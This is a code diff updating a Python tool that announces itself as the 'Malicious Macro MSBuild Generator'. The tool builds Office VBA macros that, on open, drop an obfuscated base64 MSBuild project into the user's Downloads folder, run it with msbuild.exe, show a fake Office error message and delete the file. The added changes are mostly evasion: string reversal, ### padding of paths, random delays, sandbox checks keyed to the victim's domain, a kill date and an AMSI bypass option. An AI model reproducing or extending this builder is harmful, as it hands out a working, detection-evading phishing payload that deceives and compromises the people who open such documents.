@@ -23,7 +23,7 @@ def chunks(l, n):
         yield l[i:i+n]
 
 def gen_str():
-	return ''.join(random.choice(string.letters) for i in range(random.randint(12,20)))
+	return ''.join(random.choice(string.letters) for i in range(random.randint(8,12)))
 
 def minimize(output):
     output = re.sub(r'\s*\<\!\-\- .* \-\-\>\s*\n', '', output)
@@ -95,17 +95,23 @@ def generate_custom(filename):
 
     return content
 
-def generate_macro(msbuild_template, amsi_bypass=False):
+def generate_macro(msbuild_template, amsi_bypass=False, sandbox=False, killdate=False):
 	Method = gen_str()
 	Method2 = gen_str()
+	Method3 = gen_str()	
 	Str = gen_str()
-	Str2 = gen_str()
+
+	csproj = random.choice([
+		"TrackPackageWeb","DebugInfo","CoppisAdditions","BusinessLayer",
+		"NativeClientVSAddIn", "WikiUpdater","AuthorizeNet.Helpers",
+		"CreateWordDoc","TimeSeries","JUpdate","UnityImageProcessing",
+		"LogicLayer"])
 
 	msbuild_encoded = base64.b64encode(minimize(msbuild_template))
 	chunk = list(chunks(msbuild_encoded,200))
 
 	macro_str = ''
-
+	
 	if amsi_bypass == True:
 		macro_str += 'Function ' + Method2 + '()\n'
 		# https://github.com/outflanknl/Scripts/raw/master/AMSIbypasses.vba	
@@ -117,21 +123,24 @@ def generate_macro(msbuild_template, amsi_bypass=False):
 		macro_str += 'End Function\n\n'
 
 		macro_str += "Sub AutoNew()\n"
-		macro_str += '  ' + Method
+		if sandbox is not None:
+			macro_str += '  ' + Method3
+		else:
+			macro_str += '  ' + Method	
 		macro_str += '\nEnd Sub\n\n'
 
-	macro_str += 'Function Base64Decode(ByVal vCode)\n'
+	macro_str += 'Function decodeBase64(ByVal vCode)\n'
 	macro_str += '  Dim oXML, oNode\n'
 	macro_str += '  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")\n'
 	macro_str += '  Set oNode = oXML.CreateElement("base64")\n'
 	macro_str += '  oNode.dataType = "bin.base64"\n'
 	macro_str += '  oNode.Text = vCode\n'
-	macro_str += '  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)\n'
+	macro_str += '  decodeBase64 = sBinToStr(oNode.nodeTypedValue)\n'
 	macro_str += '  Set oNode = Nothing\n'
 	macro_str += '  Set oXML = Nothing\n'
 	macro_str += 'End Function\n'
 
-	macro_str += '\nPrivate Function Stream_BinaryToString(Binary)\n'
+	macro_str += '\nPrivate Function sBinToStr(Binary)\n'
 	macro_str += '  Const adTypeText = 2\n'
 	macro_str += '  Const adTypeBinary = 1\n'
 	macro_str += '  Dim BinaryStream\n'
@@ -142,44 +151,80 @@ def generate_macro(msbuild_template, amsi_bypass=False):
 	macro_str += '  BinaryStream.Position = 0\n'
 	macro_str += '  BinaryStream.Type = adTypeText\n'
 	macro_str += '  BinaryStream.Charset = "us-ascii"\n'
-	macro_str += '  Stream_BinaryToString = BinaryStream.ReadText\n'
+	macro_str += '  sBinToStr = BinaryStream.ReadText\n'
 	macro_str += '  Set BinaryStream = Nothing\n'
 	macro_str += 'End Function\n\n'
 
 	macro_str += 'Function ' + Method + '()\n'
 
-	payload = Str+" = \"" + str(chunk[0]) + "\"\n"
+	payload = Str+" = StrRev(\"" + str(chunk[0])[::-1] + "\")\n"
 
 	for chk in chunk[1:]:
-	    payload += "  "+Str+" = "+Str+" + \"" + str(chk) + "\"\n"
+	    payload += "  "+Str+" = "+Str+" + StrRev(\"" + str(chk)[::-1] + "\")\n"
 
 	macro_str += '  ' + payload
 
-	macro_str += '\n  Open Environ("PUBLIC") & "\Downloads" & "\{}.csproj" For Output As #1\n'.format(Str2)
-	macro_str += '  Print #1, Base64Decode(' + Str + ')\n'
+	macro_str += '\n  Open Environ(Replace("U###SE###RP###ROF###ILE","###","")) & "\\" & Replace("D###ow###nl###oa###ds","###","") & "\{}.csproj" For Output As #1\n'.format(csproj)
+	macro_str += '  Print #1, decodeBase64(' + Str + ')\n'
 	macro_str += '  Close #1\n\n'
 
+	macro_str += '  Delay("00:00:" & Int((20 - 1 + 1 ) * Rnd + 1))\n'
 	# https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3
-	macro_str += '  Set SW = GetObject("n" & "e" & "w" & ":" & Replace("{9BA0###597###2-F6A###8-11CF###-A44###2-00A###0C9###0A8###F3###9}","###","")).Item()\n'
-	macro_str += '  SW.Document.Application.ShellExecute Replace("m###s###b###u###i###l###d###.e###x###e","###",""), Environ("PUBLIC") & "\Downloads" & "\{}.csproj", WhereIs(), Null, 0\n\n'.format(Str2)	
-
+	macro_str += '  Set SW = GetObject("n" & "e" & "w" & ":" & Replace("{9B###A0###597###2-F6A###8-11CF###-A44###2-00A###0C9###0A8###F3###9}","###","")).Item()\n'
+	macro_str += '  SW.Document.Application.ShellExecute Replace("m###s###b###u###i###l###d###.e###x###e","###",""), Environ(Replace("U###SE###RP###ROF###ILE","###","")) & "\\" & Replace("D###ow###nl###oa###ds","###","") & "\{}.csproj", WhereIs(), Null, 0\n\n'.format(csproj)	
 	macro_str += '  MsgBox "This application appears to be made on an older version of the Microsoft Office product suite. Visit https://microsoft.com for more information. [ErrorCode: 4439]", vbExclamation, "Microsoft Office Corrupt Application (Compatibility Mode)"\n\n'
-	macro_str += '  WaitUntil = Now() + TimeValue("00:00:15")\n'
-	macro_str += '  Do While Now < WaitUntil\n'
-	macro_str += '  Loop\n'
-	macro_str += '  kill Environ("PUBLIC") & "\Downloads" & "\{}.csproj"\n'.format(Str2)	
+
+	macro_str += '  Delay("00:00:" & Int((10 - 1 + 1 ) * Rnd + 1))\n'
+	macro_str += '  Kill Environ(Replace("U###SE###RP###ROF###ILE","###","")) & "\\" & Replace("D###ow###nl###oa###ds","###","") & "\{}.csproj"\n'.format(csproj)	
 	macro_str += 'End Function\n\n'
 
+	if sandbox is not None:
+		macro_str += 'Function ' + Method3 + '()\n'		
+		domains = ' + '.join(['Chr({})'.format(ord(i)) for i in sandbox.lower()])
+		macro_str += '  arrDomains = Split(%s, Chr(44))\n' % domains
+		macro_str += '  If (UBound(Filter(arrDomains, LCASE(Environ("USERDOMAIN")))) > -1) = True Then\n'
+		macro_str += '    ' + Method
+		macro_str += "\n  End If\n"
+		macro_str += 'End Function\n\n'
+			
 	if amsi_bypass == True:
 		Method = Method2
 
+		if sandbox is not None:
+			Method3 = Method2
+	
+	macro_str += 'Sub Auto_Open()\n'
+			
+	if killdate is not None:		
+		macro_str += '  Dim exdate As Date\n'
+		macro_str += '  exdate = "%s"\n' % killdate
+		macro_str += '  If Date < exdate Then\n  '
+
+	if sandbox is not None:
+		macro_str += '  ' + Method3
+	else:
+		macro_str += '  ' + Method	
+
+	if killdate is not None:
+		macro_str += '\n  End If'
+
+	macro_str += '\nEnd Sub\n\n'
+
 	macro_str += 'Sub AutoOpen()\n'
-	macro_str += '  ' + Method
+	macro_str += '  Auto_Open'	
 	macro_str += '\nEnd Sub\n\n'
 
 	macro_str += 'Sub Workbook_Open()\n'
-	macro_str += '  ' + Method
+	macro_str += '  Auto_Open'	
 	macro_str += '\nEnd Sub\n\n'
+
+	macro_str += 'Function StrRev(StrR as String) As String\n'
+	macro_str += '  For i = Len(StrR) to 1  Step-1\n'
+	macro_str += '    var= Mid(StrR, i, 1)\n'
+	macro_str += '    Rev = Rev & var\n'
+	macro_str += '  Next\n'
+	macro_str += '  StrRev = Rev\n'
+	macro_str += 'End Function\n\n'
 
 	macro_str += 'Function FileExists(ByVal FileToTest As String) As Boolean\n'
 	macro_str += '   FileExists = (Dir(FileToTest) <> "")\n'
@@ -190,14 +235,20 @@ def generate_macro(msbuild_template, amsi_bypass=False):
 	macro_str += '  Dim needful As String\n'
 	macro_str += '  Dim location_pw As String\n\n'
 
-	macro_str += '  business = Replace("C:\Win###do###ws\###Micr###osof###t.NET\Fr###amewo###rk\\", "###", "")\n'
-	macro_str += '  needful = Replace("\ms###bu###ild.###exe", "###", "")\n\n'
+	macro_str += '  business = Replace("C###:\###Win###do###ws\###Micr###osof###t.NET\Fr###amewo###rk\\", "###", "")\n'
+	macro_str += '  needful = Replace("\###ms###bu###ild.###exe", "###", "")\n\n'
 	macro_str += '  If FileExists(business & "v4.0.30319\\" & needful) Then\n'
 	macro_str += '     location_pw = business & "v4.0.30319\\"\n'
 	macro_str += '  ElseIf FileExists(business & "v3.5\\" & needful) Then\n'
 	macro_str += '     location_pw = business & "v3.5\\"\n'
 	macro_str += '  End If\n'
 	macro_str += '  WhereIs = location_pw\n'
+	macro_str += 'End Function\n\n'
+
+	macro_str += 'Function Delay(time as String) As String\n'
+	macro_str += '  WaitUntil = Now() + TimeValue(time)\n'
+	macro_str += '  Do While Now < WaitUntil\n'
+	macro_str += '  Loop\n'
 	macro_str += 'End Function'
 
 	return macro_str
@@ -219,7 +270,7 @@ def banner():
 | $$ \/  | $$|  $$$$$$/|  $$$$$$/
 |__/     |__/ \______/  \______/ 
 
-Malicious Macro MSBuild Generator v2.0
+Malicious Macro MSBuild Generator v2.1
 Author : Rahmat Nurfauzi (@infosecn1nja)
    """
 
@@ -232,6 +283,8 @@ if __name__ == "__main__":
    parser.add_argument('-p','--payload', help='Choose a payload for powershell, raw shellcode or custom', required=True)
    parser.add_argument('-o','--output', help='Output filename for the macro', required=True)
    parser.add_argument('-a','--amsi_bypass', help='Macro AMSI Bypass Execute via ms office trusted location', action='store_true')
+   parser.add_argument('-d','--domain', help=' Sandbox evasion technique using environmental keying domain checking. Use comma separating to set multiple domains')
+   parser.add_argument('-k','--kill_date', help='Set kill date format [dd/MM/yyyy] the payload do not run on or after this day')
 
    args = parser.parse_args()
 
@@ -239,6 +292,8 @@ if __name__ == "__main__":
    payload = args.payload
    output = args.output
    amsi_bypass = args.amsi_bypass
+   domain = args.domain
+   killdate = args.kill_date
 
    msbuild_payload = ''
 
@@ -254,6 +309,6 @@ if __name__ == "__main__":
 
    if msbuild_payload != '':
    	print "[*] Writing msbuild {} payload.".format(payload)
-   	macro = generate_macro(msbuild_payload, amsi_bypass)
+   	macro = generate_macro(msbuild_payload, amsi_bypass, domain, killdate)
    	output_file(output,macro)
    	print "[*] {} macro sucessfully saved to disk.".format(output)
